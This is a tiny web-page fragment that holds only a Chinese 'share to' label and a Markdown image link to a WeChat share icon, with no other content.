分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

